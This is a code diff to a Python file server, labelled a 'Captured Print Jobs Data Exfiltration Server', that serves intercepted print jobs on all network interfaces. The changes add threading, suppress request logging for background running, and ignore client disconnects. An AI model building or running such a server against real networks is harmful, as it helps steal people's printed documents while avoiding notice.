@@ -6,10 +6,20 @@ Captured Print Jobs Data Exfiltration Server
 import os
 import socket
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+from socketserver import ThreadingMixIn
+
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    """Handle requests in a separate thread."""
+    daemon_threads = True
+    allow_reuse_address = True
 
 class FileServerHandler(SimpleHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
         super().__init__(*args, directory=".", **kwargs)
+    
+    def log_message(self, format, *args):
+        """Override to reduce logging noise"""
+        pass  # Silent logging in background mode
     
     def do_GET(self):
         # Redirect root to converted folder
@@ -19,7 +29,7 @@ class FileServerHandler(SimpleHTTPRequestHandler):
             self.end_headers()
             return
         
-        # Use default behavior which calls our custom list_directory
+        # Use default behavior
         return super().do_GET()
     
     def list_directory(self, path):
@@ -57,10 +67,9 @@ class FileServerHandler(SimpleHTTPRequestHandler):
                 <ul class="file-list">
         """
         
-        # Check the URL path, not filesystem path
         url_path = self.path
         
-        # Add parent directory link - hide when in captured_print_jobs folder
+        # Add parent directory link
         if url_path != "/captured_print_jobs/" and url_path != "/":
             html_content += '''
                 <li class="file-item directory">
@@ -116,7 +125,12 @@ class FileServerHandler(SimpleHTTPRequestHandler):
         self.send_header("Content-type", "text/html; charset=utf-8")
         self.send_header("Content-Length", str(len(encoded_content)))
         self.end_headers()
-        self.wfile.write(encoded_content)
+        
+        try:
+            self.wfile.write(encoded_content)
+        except BrokenPipeError:
+            pass  # Client disconnected
+        
         return None
 
 def get_local_ip():
@@ -144,7 +158,7 @@ def main():
     
     for port in ports_to_try:
         try:
-            server = HTTPServer(('0.0.0.0', port), FileServerHandler)
+            server = ThreadedHTTPServer(('0.0.0.0', port), FileServerHandler)
             local_ip = get_local_ip()
             
             print("=" * 50)
